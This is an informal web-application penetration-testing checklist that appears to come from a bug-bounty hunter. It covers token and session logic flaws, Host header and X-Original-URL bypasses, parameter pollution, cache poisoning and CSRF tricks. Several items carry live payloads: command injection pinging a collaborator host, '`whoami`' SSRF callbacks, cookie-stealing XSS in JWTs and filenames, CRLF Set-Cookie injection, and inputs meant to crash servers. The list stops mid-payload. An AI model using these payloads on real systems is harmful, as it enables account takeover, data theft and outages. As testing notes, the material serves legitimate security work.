                  Logic and tokens
0 - validate token after use , email change , password  change , the second token requested 
1-  try to login with two users and see tokens from  inspect -> application and compare them  
2-  you can login and copy token and logout and try to put token back see if you can access   
3-  try to forget password and send code then in the same session add any link to internal profile and see if you can access account data ex: /myaccount (don't reload)  ... you can verfiy if you got session id from >> inspect > applicatoin 
3- try to reset password while more than one device is loged in and reset the password then you can use two sessions in the same time one (which changed the password ) and the other which (is previously loged in and didn't loged out )
3- open firefox and chrome for the same site and login in both change password in chrome and observe firefox still work 
4- try to register as admin then you will get inavalible username >> in the same session go to /myaccount  (don't reload) 
5- if transaction of money from hossam to ali then ?from=hossam&to=ali  can make http polution by &from=ali&from=hossam&to=hossam&to=ali
6- login and go to myacount and change the name or id 
7- if found example.com/?lang=en   in link try to find /?lang=database.yml or any senstive files  
8- try to change the email and observe if there is roleid in response if found change it and put it in the request 
9- try to change the id in url in /myaccount if id unpredictable tr to find post of this person and put id in /myaccount
10- if there is downloadable file try to change the name of request file to download and anaylise it 
11- if need to access /admin and can't then remove it from GET and put X-Original-URL: /admin and if there is any parameters put them in GET /?username=admin put if any direcotry put it in X-Original-URL: /admin/changeusername
12- when trying to make action and non authurized try to change method 
13- try to go to /api and change the method to post then put {} in the body to make response json
14- login to page and reset password put 150 chars and reset if applied then put 2500 chars then server will crash 
15- verify that reset and register and change email links are not valid for ever try send them and change account email or password many times and verfiy that if the first link is valid or not 
16- when found param ?ref= or ssid= in link try to fill it with ?ref=,,,,,,,,,,,,,,,, as you can as it's gonna make system crash 
17- when buying something with coupons  try to put the coupon more than one time or put two coupons alternativily one after one if accepted continue this until finish
18- try to register with registed account before but add "hossam@gmial.com\n" and see if it will register again 
19- try to reset password and use Host header (it's common for developers to use host header in reset password ) and put http://collaborator.com/ and see if there was dns in burpcollaborator oe you can go to your email and sea the link
20- smtp header injection can be found in contact us forms 
21- try to change host header to anything and see the response if ok 200 put localhost or 127.0.0.1 to get unauthrized admin
22- try to put 2 hosts and see if the second host of hacker appear in response if it then make file.js and alert(1)
23- try tp change the host if ok then try to put ip 192.168.0.0 and send to intruder,change last $0$ and try 1-255 see response
24- try to put  GET http://example.com HTTP/1.1 and put host anything see if accepted then use collaborator in host
25- try to sent to paramminer to see if origin: hossamshady.com or null and the injection found in portswigger labs  
26- try to put TRACE instead of GET and see if X-Custom-IP-Authorization header appeared then go to match and replace and leave match field blank and put in replace X-Custom-IP-Authorization: 127.0.0.1 it will give you access for unauthorized places/admin
27- try /.git and if found wget -r the link and analysis it with (git cola tool ) 
28- if anything is reflected in page and see x-cache if found then use reflected xss and poison it 
29- Yandex search engine for more data in search
30- try fuzzing /api/v1/ and see what files there 
31- when responsing of missing header put it and put any value then try to change the method request 
32- when directory fails 401 unauthorized then use tool (davtest)
33- en-US/splunkd/_raw/services/server/info/server-info?output_mode=json ==> for splunk information disclosure
34- if found feedback email put hossam||ping+burpcollaborator+||  ==> if there is any interaction then => Blind OS command injection with out-of-band interaction
35- if found /?jwt=token  try to inject token => xss via jwt= 
                    1. Make a jwt token and insert a xss paylaod. ==> inject the name or the "role":"<script>alert(document.cookie)</script>"
                    2. The final url is like url/dest?jwt=vulnerable-jwt-token. 
                    (jwt= paramter was decoding the provided jwt token and show's it into the page). 
36- always use TRACE instead of GET to know the way of request and hidden headers and if found X-Custom-Ip-Authorization: put 127.0.0.1
37- easy RCE from SSRF
          If you got HTTP pingback on your server, also give this a try
          payload used   :  `whoami`.collaborator-url 
          got callback from  :  root.collaborator-url
      
 38- if found file upload upload file, intercept it and change the name of file <svg/onload=alert``>.txt and send  
 39- try cache deception attack by going to page with senstive information and put file.css in url and try to access many times it should show the senstive page 
40- try to put port in host: example.com:123 in reset password and see if that is reflected in email reset password token and if so add https://example.com:@burpcollaborator.net  or "'><a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?

   2- if there is token : - try to change request method from post to get and remove csrftoken and see if worked
   3- try to remove the csrftoken and see if the same response
   4- try to make csrftoken in any live account and drop the request to be unused  csrf token and try to use it (one time use)
         - open firefox and try to change email , intercept it and take token and drop the request and then make csrf poc
   5- if you found anything reflected in headers response then you can inject any other header with putting -> in the place         which is reflect  =hossamshady%0D%0ASet-Cookie: csrfKey=hossamshady1011393%3b SameSite=None"
